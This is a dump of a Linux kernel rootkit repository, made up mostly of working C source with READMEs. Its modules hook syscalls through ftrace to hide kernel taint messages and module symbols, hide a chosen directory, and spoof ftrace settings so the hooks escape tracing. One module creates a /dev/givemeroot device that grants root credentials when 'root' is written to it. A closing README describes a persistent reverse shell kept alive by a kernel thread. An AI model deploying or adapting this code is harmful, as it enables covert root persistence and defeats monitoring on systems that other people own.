    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

int fh_install_hook(struct ftrace_hook *hook);

int notrace fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook);

void notrace fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count);

int notrace fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

void notrace fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

#endif

```

`Ring0/clear-taint-dmesg/matheuz.c`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "ftrace.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec/fs3cs0ciety");
MODULE_DESCRIPTION("POC/Demo hiding 'taint' messages from /dev/ksmg and the modules functions from /proc/kallsyms");

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs); // Pointer to the original read function

// Hooked function that intercepts the syscall read
static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    size_t count = regs->dx; // Number of bytes to read
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    // Check if the fd is from /dev/kmsg or /proc/kallsyms
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file) {
        // Check if the file is /dev/kmsg or /proc/kallsyms or /sys/kernel/tracing/touched_functions
        if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0) {
            fput(file); // Frees the file object after verification

            // Allocates a temporary buffer in kernel space
            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                printk(KERN_ERR "Failed to allocate temporary buffer.\n");
                return -ENOMEM;
            }

            // Calls the original function to read data from the file
            bytes_read = orig_read(regs);
            if (bytes_read < 0) {
                kfree(kernel_buf);
                return bytes_read;
            }

            // Copies data read from user space to the buffer in the kernel for processing
            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            // Filter out lines that contain the words "taint" or "lkm"
            char *filtered_buf = kzalloc(B_F, GFP_KERNEL); // Buffer for filtered messages
            if (!filtered_buf) {
                kfree(kernel_buf);
                return -ENOMEM;
            }

            char *line, *line_ptr;
            size_t filtered_len = 0;

            // Process the kernel buffer, line by line
            line = kernel_buf;
            while ((line_ptr = strchr(line, '\n'))) {
                *line_ptr = '\0';  // Temporarily terminate the line

                // Check if the line contains "taint" or "lkm"
                if (!strstr(line, "taint") && !strstr(line, "matheuz")) {
                    size_t line_len = strlen(line);
                    if (filtered_len + line_len + 1 < B_F) {  // Check for space in the filtered buffer
                        strcpy(filtered_buf + filtered_len, line);  // Append the line
                        filtered_len += line_len;
                        filtered_buf[filtered_len++] = '\n';  // Add newline after the line
                    }
                }

                line = line_ptr + 1;  // Move to the next line
            }

            // Ensures the final buffer is null-terminated
            filtered_buf[filtered_len] = '\0';

            // Copy the filtered buffer back to userspace
            if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
                kfree(kernel_buf);
                kfree(filtered_buf);
                return -EFAULT;
            }

            kfree(kernel_buf);
            kfree(filtered_buf);
            return filtered_len;
        }

        fput(file); // Frees the file object if it's neither /dev/kmsg nor /proc/kallsyms
    }

    return orig_read(regs); // Calls the original reading function if it's not /dev/kmsg or /proc/kallsyms
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init poop_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_ERR "Oh nooo, error ://\n");
        return err;
    }
    printk(KERN_INFO "Join: https://discord.gg/66N5ZQppU7.\n");
    return 0;
}

static void __exit poop_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Join: https://discord.gg/66N5ZQppU7\n");
}

module_init(poop_init);
module_exit(poop_exit);


```

`Ring0/device-root/Makefile`:

```
obj-m := device.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/device-root/README.md`:

```md

## **Creating a char device to set root for us**

NOTE: the test was done on `Ubuntu 20.04.6 LTS` on kernel `5.15.0-119-generic`, so this may not work on a newer kernel, for example 6.6x, but the idea and logic is the same.

The goal of this post is to create a simple device, which, when we do `echo root > /dev/givemeroot`, becomes root.

This can be used in  post-compromise, for example, you already got root, loaded this LKM and by accident lost root access, so since you loaded this LKM, you just need to have access to the machine again even with the lowest possible privilege and Simply use the mentioned command, and you will become root.

<p align="center"><img src="image.png"></p>

In short, this LKM (Loadable Kernel Module) creates a char device called `/dev/givemeroot`. The device allows users to write strings to it, and if the string is "root", the process that wrote to the device will have its credentials set to those of the root user. 

Btw, the device supports only the `write` operation, implemented via the `x_write` function, where the command is interpreted and actioned based on the input string.

```

`Ring0/device-root/device.c`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/device.h>

#define CLASS "giveroot"
#define DEVICE "givemeroot"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mtzsec");
MODULE_DESCRIPTION("Writing a device for set root");

static int major_number;                     
static struct class* giveroot = NULL;       
static struct device* c_device = NULL;       

static ssize_t x_write(struct file *file, const char __user *buffer, size_t len, loff_t *offset) {
    char *kernel_buffer;
    
    kernel_buffer = kmalloc(len + 1, GFP_KERNEL);
    if (!kernel_buffer)
        return -ENOMEM;

    if (copy_from_user(kernel_buffer, buffer, len)) {
        kfree(kernel_buffer);
        return -EFAULT;
    }
    
    kernel_buffer[len] = '\0';
    
    if (strncmp(kernel_buffer, "root", 4) == 0) {
        struct cred *new_creds;
        new_creds = prepare_creds();
        if (new_creds == NULL) {
            kfree(kernel_buffer);
            return -ENOMEM;
        }

        new_creds->uid.val = 0;
        new_creds->gid.val = 0;
        new_creds->euid.val = 0;
        new_creds->egid.val = 0;
        new_creds->fsgid.val = 0;
        new_creds->sgid.val = 0;
        new_creds->fsuid.val = 0;

        commit_creds(new_creds);
        printk(KERN_INFO "G0t r00t!!\n");
    }

    kfree(kernel_buffer);
    return len;
}

static struct file_operations fops = {
    .write = x_write,
};

static int __init device_init(void) {
    major_number = register_chrdev(0, DEVICE, &fops);
    if (major_number < 0) {
        printk(KERN_ALERT "Failed to register device!\n");
        return major_number;
    }

    giveroot = class_create(THIS_MODULE, CLASS);
    if (IS_ERR(giveroot)) {
        unregister_chrdev(major_number, DEVICE);
        printk(KERN_ALERT "Failed to create device class!\n");
        return PTR_ERR(giveroot);
    }

    c_device = device_create(giveroot, NULL, MKDEV(major_number, 0), NULL, DEVICE);
    if (IS_ERR(c_device)) {
        class_destroy(giveroot);
        unregister_chrdev(major_number, DEVICE);
        printk(KERN_ALERT "Failed to create device!\n");
        return PTR_ERR(c_device);
    }

    printk(KERN_INFO "Device /dev/%s created successfully!\n", DEVICE);
    return 0;
}

static void __exit device_exit(void) {
    device_destroy(giveroot, MKDEV(major_number, 0));
    class_destroy(giveroot);
    unregister_chrdev(major_number, DEVICE); 
    printk(KERN_INFO "Device removed!\n");
}

module_init(device_init);
module_exit(device_exit);

```

`Ring0/ftrace-protect/Makefile`:

```
obj-m += matheuz.o 

all:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
```

`Ring0/ftrace-protect/Readme.md`:

```md
## Simple PoC for Silently Blocking All `writes` to `ftrace_enabled` && `tracing_on` as Well as Spoofing the Read from Those Files When Enabled to Appear Off

### Overview
This Linux kernel module ensures that all `write` operations to the files `/proc/sys/kernel/ftrace_enabled` and `/sys/kernel/tracing/tracing_on` are silently blocked. Additionally, the module spoofs the read value of these files to appear as `0` when they are actually enabled (`1`), but only once per read attempt to avoid spamming `0`s.

The goal is to maintain the integrity of the hooks while keeping them hidden from detection or tampering. This is achieved through custom hooks implemented for the `read` and `write` syscalls.

---

### Snippet from `hooks/read.h`

```c
// If the current value is "1" change it to "0" once; avoids repeated spoofing.
if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
    kernel_buf[0] = '0';
    spoof_next_read = 1; // Ensure spoof happens only once
} else {
    spoof_next_read = 0; // Reset spoof for subsequent reads
}
```

---

### Snippet from `hooks/write.h`

```c
/* Silently blocks writes to ftrace_enabled and tracing_on using the same 
   method employed in clear-taint-dmesg, but adapted for the write syscall. */

if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
    strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
        
    fput(file); // Free the file object after verification

    // Allocate a temporary buffer in kernel space
    kernel_buf = kmalloc(B_F, GFP_KERNEL);
    if (!kernel_buf) {
        return -ENOMEM;
    }

    // Copy data from user space to kernel space buffer
    if (copy_from_user(kernel_buf, user_buf, count)) {
        kfree(kernel_buf);
        return -EFAULT;
    }

    // Check for "1" or "0" and handle appropriately
    if (strncmp(kernel_buf, "1", 1) == 0) {
        // ftrace enabled
    } else if (strncmp(kernel_buf, "0", 1) == 0) {
        // ftrace disabled
    }

    kfree(kernel_buf);
    return count; // Simulate a successful write
}
```

---

### Example Usage

<p align="center"><img src=".img/ftrace.jpg"></p>

```bash
echo 0 > /proc/sys/kernel/ftrace_enabled; echo 0 > /sys/kernel/tracing/tracing_on
# Silently blocked; write does not succeed

cat /proc/sys/kernel/ftrace_enabled; cat /sys/kernel/tracing/tracing_on
# Outputs 0 (even if internally it remains enabled)
```

### Extra 

[![Discord](https://img.shields.io/badge/Discord-%235865F2.svg?&logo=discord&logoColor=white)](https://discord.gg/66N5ZQppU7)
[![C](https://img.shields.io/badge/C-00599C?logo=c&logoColor=white)]()
[![Linux](https://img.shields.io/badge/Linux-FCC624?logo=linux&logoColor=black)]()

```

`Ring0/ftrace-protect/ftrace/ftrace.h`:

```h
#ifndef _FTRACE_H_
#define _FTRACE_H_

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>

#define KPROBE_LOOKUP 1

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "DMESG: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    struct pt_regs *regs = ftrace_get_regs(fregs);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

int fh_install_hook(struct ftrace_hook *hook);

int notrace fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook);

void notrace fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "DMESG: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

int fh_install_hooks(struct ftrace_hook *hooks, size_t count);

int notrace fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

void notrace fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

#endif
```

`Ring0/ftrace-protect/hooks/read.h`:

```h
#ifndef READ_H
#define READ_H

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*og_read)(const struct pt_regs *regs); // Pointer to the original read function

static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    static int spoof_next_read = 0; // Used to spoof one read

    // Check if the fd is from /proc/sys/kernel/ftrace_enabled or /proc/sys/kernel/tracing_on
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file) {
        if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
            
            fput(file); // Free the file object after verification

            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                return -ENOMEM;
            }

            bytes_read = og_read(regs);
            if (bytes_read < 0) {
                kfree(kernel_buf);
                return bytes_read;
            }

            if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            // If the current val is "1" we need to spoof it, change it to "0" once. If not the zeros are so bad bro ...
            if (spoof_next_read == 0 && strncmp(kernel_buf, "1", 1) == 0) {
                kernel_buf[0] = '0';
                spoof_next_read = 1; // Ensure spoof happens only once
            } else {
                spoof_next_read = 0; // Reset spoof 
            }

            if (copy_to_user(user_buf, kernel_buf, bytes_read)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            kfree(kernel_buf);
            return bytes_read;
        }

        fput(file);
    }

    return og_read(regs);
}

#endif
```

`Ring0/ftrace-protect/hooks/write.h`:

```h
#ifndef WRITE_H
#define WRITE_H

#define B_F 4096  // Temporary buffer size for reading/writing

static asmlinkage ssize_t (*og_write)(const struct pt_regs *regs); // Pointer to the og write function

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of write: fd
    const char __user *user_buf = (const char __user *)regs->si; // Second argument: input buffer from user
    size_t count = regs->dx; // Number of bytes to write

    char *kernel_buf;
    struct file *file;

    file = fget(fd); // Get the file object corresponding to the fd
    if (file) {

        /* Silently blocks writes to ftrace_enabled and tracing_on using sorta the 
           same trick we used in clear-taint-dmesg but for the write syscall. 
        */

        if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
            
            fput(file); // Free the file object after verification

            // Allocate a temporary buffer in kernel space
            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                return -ENOMEM;
            }

            // Copy data from user space to kernel space buffer
            if (copy_from_user(kernel_buf, user_buf, count)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            // Check for "1" or "0" and handle appropriately
            if (strncmp(kernel_buf, "1", 1) == 0) {
                // ftrace enabled
            } else if (strncmp(kernel_buf, "0", 1) == 0) {
                // ftrace disabled
            }

            kfree(kernel_buf);
            return count; // Simulate a successful write
        }

        fput(file); // Free the file object if it is not ftrace_enabled or tracing_on
    }

    return og_write(regs); // Call the original write function otherwise
}

#endif
```

`Ring0/ftrace-protect/include/headers.h`:

```h
#ifndef HEADERS_H
#define HEADERS_H

#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/rcupdate.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/utsname.h>
#include <linux/proc_fs.h>

#endif // HEADERS_H
```

`Ring0/ftrace-protect/matheuz.c`:

```c
/* Simple POC of hooking read and write to protect our ftrace
 hooks from being disabled and exposed to tracing tools.*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

// Kernel Header Lib
#include "include/headers.h"

// Ftrace Lib for syscall tracing
#include "ftrace/ftrace.h"

// Ftrace Hooks
#include "hooks/write.h"
#include "hooks/read.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fs3cs0ciety");
MODULE_DESCRIPTION("Simple POC of hooking read and write to block writes to ftrace_enabled and tracing_on to protect our ftrace hooks from being disabled and exposed to logs/tracing tools.");

// Simple and Clean
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_write", hooked_write, &og_write),
    HOOK("__x64_sys_read", hooked_read, &og_read),
};

static int __init matheuz_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    if (err) {
        return err;
    }

    return 0;
}

static void __exit matheuz_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(matheuz_init);
module_exit(matheuz_exit);


```

`Ring0/hiding_directory/Makefile`:

```
obj-m := leviathan.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/hiding_directory/README.md`:

```md
# **Hiding directory by doing syscall hooking**

It's common for attackers to like to hide their directories, processes, connections, etc. after compromising an environment... And today I'm going to show you how we can hide directories.

To be able to hide a directory, for example, we need to hook the `getdents` system call, which is used to read directory entries, it is similar to `readdir()`, but operates at a lower level, interacting directly with the kernel ( ring0).

<p align="center"><img src="image.png"></p>

```

`Ring0/hiding_directory/ftrace_helper.h`:

```h
/*
 * Helper library for ftrace hooking kernel functions
 * Author: Harvey Phillips (xcellerator@gmx.com)
 * License: GPL
 * */

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, 
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}

/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Ordinarily ftrace provides its own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes it easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    hook->address = kallsyms_lookup_name(hook->name);

    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

/* See comment below within fh_install_hook() */
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /* For many function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning it OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	   | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 * */
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0 ; i < count ; i++)
        fh_remove_hook(&hooks[i]);
}

```

`Ring0/hiding_directory/leviathan.c`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include "ftrace_helper.h"

#define HIDE_DIR "kraken"     // Your Directory name to hide

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mtzsec");
MODULE_DESCRIPTION("A module that hooks getdents64 to hide directories");

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

// Hooked getdents64 function
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_dir_buffer = NULL;
    struct linux_dirent64 *current_entry = NULL;
    struct linux_dirent64 *prev_entry = NULL;
    long error;
    unsigned long offset = 0;
    long result;

    result = orig_getdents64(regs);
    if (result <= 0) {
        return result;
    }

    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) {
        return -ENOMEM;
    }

    error = copy_from_user(kernel_dir_buffer, user_dir, result);
    if (error) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    while (offset < result) {
        current_entry = (struct linux_dirent64 *)((char *)kernel_dir_buffer + offset);

        if (strncmp(current_entry->d_name, HIDE_DIR, strlen(HIDE_DIR)) == 0) {
            if (current_entry == kernel_dir_buffer) {
                result -= current_entry->d_reclen;
                memmove(kernel_dir_buffer, (char *)kernel_dir_buffer + current_entry->d_reclen, result);
                continue;
            }

            if (prev_entry) {
                prev_entry->d_reclen += current_entry->d_reclen;
            }
        } else {
            prev_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    error = copy_to_user(user_dir, kernel_dir_buffer, result);
    kfree(kernel_dir_buffer);

    return result;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init leviathan_init(void) {
    int error;

    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (error) {
        return error;
    }
    return 0;
}

static void __exit leviathan_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(leviathan_init);
module_exit(leviathan_exit);

```

`Ring0/persistent-thread/Makefile`:

```
obj-m := lkm.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/persistent-thread/README.md`:

```md

# **Persistent Reverse Shell with Kernel Thread Monitoring and Uninterruptible Sleep**

Have you ever seen a process with state (D) `Uninterrupted sleep`? If you've never seen this or don't know what it is, basically they are processes that cannot be stopped by `SIGKILL` they are practically immutable to this, that is, they cannot be terminated or manipulated easily until the expected resource is freed .

So, since it can't be stopped, why not use it in a â€œmaliciousâ€ way? For example, creating an LKM that creates a `thread` to continuously monitor system processes and maintain a persistent reverse shell? That's what we're going to do!

Basically, this LKM creates a `thread` that periodically checks if the `noprocname` process is active. If it does not find `noprocname`, it executes a command to create a reverse shell. This reverse shell is kept active through a sleep set to 5 seconds. Executing the command to create the reverse shell is done through the `call_usermodehelper` function, which is used to execute a command in user space.

<p align="center"><img src="image.png"></p>

Of course, I used reverse shell just for an example, you can do other things with it, like run an ELF, run commands, etc.

